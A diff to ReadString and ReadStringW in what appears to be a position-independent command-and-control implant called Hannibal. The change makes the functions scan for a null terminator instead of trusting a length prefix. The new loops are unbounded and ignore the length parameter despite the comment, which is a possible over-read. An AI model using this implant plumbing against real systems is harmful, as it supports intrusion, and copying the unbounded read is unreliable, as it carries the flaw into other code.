@@ -105,40 +105,45 @@ SECTION_CODE UINT8* ReadBytes(UINT8 **buffer, UINT32 length)
 }
 
 /**
- * TODO: This isn't really parsing correctly. A correct implementation
- * would read bytes until a null is found. This is only usable because the 
- * TLVs are prepending the length and we're using that.
+ * Expects that the string is null terminated. If not, you can use
+ * the length param.
  */
-SECTION_CODE char* ReadString(UINT8 **buffer, UINT32 length) 
+SECTION_CODE PCHAR ReadString(UINT8 **buffer, UINT32 length) 
 {
     
     HANNIBAL_INSTANCE_PTR
 
-    // Typically used when parsing a param for a cmd. Each cmd is responsible to free this.
-    char* str = (char*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    UINT32 str_len = 0;
+    
+    while ((*buffer)[str_len] != '\0'){
+        str_len++;
+    }
+    
+    PCHAR str = (PCHAR)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, str_len + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!str) return NULL;
-    pic_memcpy(str, *buffer, length);
-    *buffer += length;
+    pic_memcpy(str, *buffer, str_len + 1);
+    *buffer += str_len + 1;
     return str;
 }
 
 /**
- * TODO: This isn't really parsing correctly. A correct implementation
- * would read bytes until a null is found. This is only usable because the 
- * TLVs are prepending the length and we're using that. See the hbin version.
+ * Expects that the string is null terminated. If not, you can use
+ * the length param.
  */
-SECTION_CODE wchar_t* ReadStringW(UINT8 **buffer, UINT32 length)
+SECTION_CODE PWCHAR ReadStringW(UINT8 **buffer, UINT32 length)
 {
     HANNIBAL_INSTANCE_PTR
 
-    // Typically used when parsing a param for a cmd. Each cmd is responsible to free this.
-    wchar_t* str = (wchar_t*)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    UINT32 str_len = 0;
+    
+    while (((PWCHAR)(*buffer))[str_len] != L'\0'){
+        str_len++;
+    }
+    
+    PWCHAR str = (PWCHAR)hannibal_instance_ptr->Win32.VirtualAlloc(NULL, (str_len + 1) * sizeof(WCHAR), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!str) return NULL;
-
-    pic_memcpy(str, *buffer, length);
-
-    *buffer += length;
-
+    pic_memcpy(str, *buffer, (str_len + 1) * sizeof(WCHAR));
+    *buffer += (str_len + 1) * sizeof(WCHAR);
     return str;
 }
 
